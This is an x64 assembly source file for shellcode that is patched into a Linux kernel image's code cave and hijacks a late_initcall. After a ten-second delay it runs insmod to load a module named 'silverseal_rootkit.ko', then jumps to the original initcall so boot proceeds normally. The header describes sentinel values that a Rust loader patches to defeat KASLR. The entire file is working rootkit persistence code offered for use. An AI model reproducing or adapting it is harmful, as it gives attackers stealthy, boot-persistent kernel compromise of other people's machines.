; lkm_loader.asm
; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
;
; Initialises a struct delayed_work and calls queue_delayed_work so the kernel
; scheduler fires the work function (lkm_worker, in a .text cave) after a
; 10-second delay. By that time userspace is running and call_usermodehelper
; can spawn insmod. Returns immediately after queuing so boot proceeds normally.
;
; All kernel addresses are encoded as PC-relative rel32/disp32 offsets — no
; absolute pointers — making this blob KASLR-safe. The Rust loader scans for
; 4-byte sentinel values and patches them with the correct relative offsets
; before writing the blob into the kernel .data code cave.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
;
; Blob layout (offsets from blob start):
;   [0]                lkm_loader code (≤128 bytes)
;   [code_end]         delayed_work_data — 96-byte struct delayed_work, zeroed;
;                        populated at runtime by lkm_loader before the call.
;   [+96]              insmod_path — "/sbin/insmod\0" (13 bytes)
;   [+109]             argv_data — 24 bytes (3 qwords); pre-built by Rust:
;                        [0] = &insmod_path virt, [8] = &path_buffer virt, [16] = 0
;   [+133]             path_buffer — "/silverseal_rootkit.ko\0", padded to 256 bytes
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   LKM_WORKER_CAVE_SENTINEL    0x11EEDDFF  disp32 in lea rax,[rip+d]
;                                             → lkm_worker_cave_virt (.text)
;   TIMER_FN_DISP_SENTINEL      0xBBCCDDEE  disp32 in lea rax,[rip+d]
;                                             → delayed_work_timer_fn (.text)
;   SYSTEM_WQ_DISP_SENTINEL     0xCCDDEEFF  disp32 in mov rdi,[rip+d]
;                                             → system_wq kernel global (load its value)
;   QUEUE_DELAYED_WORK_REL_SENTINEL 0x33445566  rel32 in call queue_delayed_work
;   ORIGINAL_FN_REL_SENTINEL    0x12345678  rel32 in jmp  original_initcall
;
; RIP-relative LEA for delayed_work_data is computed by NASM automatically.
;
; Debug: emits on COM1 (0x3F8):
;   'S' — lkm_loader entered
;   'W' — queue_delayed_work returned (work queued, 10 s delay started)
;   'J' — about to tail-call original initcall

BITS 64
default rel

; ── COM1 serial helper macro ─────────────────────────────────────────────────
; Emits a single ASCII byte on COM1 (port 0x3F8). Clobbers dx and al only.
%macro SERIAL_CHAR 1
    mov     dx, 0x3F8
    mov     al, %1
    out     dx, al
%endmacro

; ── lkm_loader: late_initcall entry ─────────────────────────────────────────
; Calling convention: Linux x86-64 System V ABI
; On entry:  rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After push rbp: rsp % 16 == 0 (16-byte aligned before any call)

lkm_loader:
    push    rbp                         ; align rsp for calls below

    SERIAL_CHAR 'S'                     ; checkpoint: shellcode entered

    ; ── Initialise struct delayed_work at runtime ─────────────────────────────
    ;
    ; struct delayed_work layout (88 bytes, we allocate 96 for safety):
    ;   [+0]  work_struct:
    ;     [+0]   atomic_long_t data   (8) — 0 = PENDING_BIT clear
    ;     [+8]   list_head entry.next (8) — &entry (self-referential → list_empty)
    ;     [+16]  list_head entry.prev (8) — &entry
    ;     [+24]  work_func_t func     (8) — &lkm_worker (.text cave)
    ;   [+32] timer_list:
    ;     [+32]  hlist_node.next  (8) — 0 (timer not pending)
    ;     [+40]  hlist_node.pprev (8) — 0 (timer not pending)
    ;     [+48]  expires          (8) — 0 (set by queue_delayed_work internally)
    ;     [+56]  function         (8) — &delayed_work_timer_fn (REQUIRED)
    ;     [+64]  flags            (4) — TIMER_IRQSAFE = 0x00200000
    ;   [+72] wq                  (8) — 0 (set by queue_delayed_work internally)
    ;   [+80] cpu                 (4) — 0 (set by queue_delayed_work internally)
    ;
    ; rdi = &delayed_work (RIP-relative LEA; NASM computes disp32 automatically)
    lea     rdi, [delayed_work_data]
    mov     qword [rdi], 0              ; work.data = 0

    lea     rax, [rdi + 8]             ; rax = &work.entry
    mov     [rdi + 8],  rax            ; entry.next = &entry  (list_empty == true)
    mov     [rdi + 16], rax            ; entry.prev = &entry

    ; work.func = &lkm_worker (in .text — permanently executable).
    ; .text caves are never made NX; no set_memory_x trick needed.
    ; disp32 patched by Rust: lkm_worker_cave_virt - (loader_cave_virt + off + 4)
    db      0x48, 0x8D, 0x05           ; REX.W LEA rax, [rip + disp32]
    dd      0x11EEDDFF                  ; LKM_WORKER_CAVE_SENTINEL
    mov     [rdi + 24], rax            ; work.func = &lkm_worker

    ; timer.function = &delayed_work_timer_fn (required — called when timer fires
    ; to re-queue the work item into the workqueue; NULL here = kernel panic).
    ; disp32 patched by Rust: dtimerfn_virt - (loader_cave_virt + off + 4)
    db      0x48, 0x8D, 0x05           ; REX.W LEA rax, [rip + disp32]
    dd      0xBBCCDDEE                  ; TIMER_FN_DISP_SENTINEL
    mov     [rdi + 56], rax            ; timer.function = &delayed_work_timer_fn

    ; timer.flags = TIMER_IRQSAFE (0x00200000) — required for workqueue timers.
    mov     dword [rdi + 64], 0x00200000

    ; ── queue_delayed_work(system_wq, &dwork, 2500) ───────────────────────────
    ; arg1 rdi = *system_wq  (dereference the kernel global to get the wq pointer)
    ; disp32 patched by Rust: system_wq_virt - (loader_cave_virt + off + 4)
    ; This MOV loads the 8-byte pointer stored at system_wq, not its address.
    db      0x48, 0x8B, 0x3D           ; REX.W MOV rdi, [rip + disp32]
    dd      0xCCDDEEFF                  ; SYSTEM_WQ_DISP_SENTINEL
    ; arg2 rsi = &delayed_work_data
    lea     rsi, [delayed_work_data]
    ; arg3 rdx = 2500 jiffies  (10 * HZ; assumes HZ=250, the Ubuntu/Debian default)
    mov     edx, 2500
    ; rel32 patched by Rust: queue_delayed_work_virt - (loader_cave_virt + off + 4)
    db      0xE8                        ; CALL rel32
    dd      0x33445566                  ; QUEUE_DELAYED_WORK_REL_SENTINEL

    SERIAL_CHAR 'W'                     ; checkpoint: work queued, delay started

    pop     rbp

    SERIAL_CHAR 'J'                     ; checkpoint: about to tail-call original

    ; Tail-call original displaced initcall — direct rel32 jmp.
    ; rel32 patched by Rust: original_target_virt - (loader_cave_virt + off + 4)
    db      0xE9                        ; JMP rel32
    dd      0x12345678                  ; ORIGINAL_FN_REL_SENTINEL

; ── Data section ─────────────────────────────────────────────────────────────
; No lkm_worker code here — the work function lives in a .text cave (lkm_worker.asm).

; struct delayed_work: 96 bytes, zeroed — populated at runtime above.
delayed_work_data:
    times   96 db 0

; Path for argv[0] passed to call_usermodehelper.
insmod_path:
    db      "/sbin/insmod", 0           ; 13 bytes

; argv array (3 qwords).
; Pre-built by Rust before the blob is written:
;   argv_data[0] = insmod_path_virt   (&insmod_path above, runtime virtual address)
;   argv_data[8] = path_buffer_virt   (&path_buffer below, runtime virtual address)
;   argv_data[16] = 0                 (NULL terminator)
; lkm_worker reads this array at work-item execution time (10 s after boot).
argv_data:
    times   24 db 0

; Path for argv[1]: the rootkit module to load.
path_buffer:
    db      "/silverseal_rootkit.ko", 0
    times   (256 - ($ - path_buffer)) db 0
